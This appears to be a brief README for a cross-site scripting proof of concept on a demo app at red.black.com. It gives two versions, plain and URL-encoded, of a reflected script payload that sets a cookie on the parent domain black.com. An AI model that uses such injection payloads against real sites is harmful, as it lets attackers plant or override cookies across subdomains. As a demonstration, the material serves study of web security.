# Description

- this app is running on the red.black.com domain.
- PoC for the XSS exploitation 

- payload to set a cookie of it's parent domain black.com
```
http://red.black.com/xss?payload=<script>document.cookie = "color=green;domain=black.com"</script>
http://red.black.com/xss?payload=%3Cscript%3Edocument.cookie%20=%20%22color=green;domain=black.com%22%3C/script%3E
```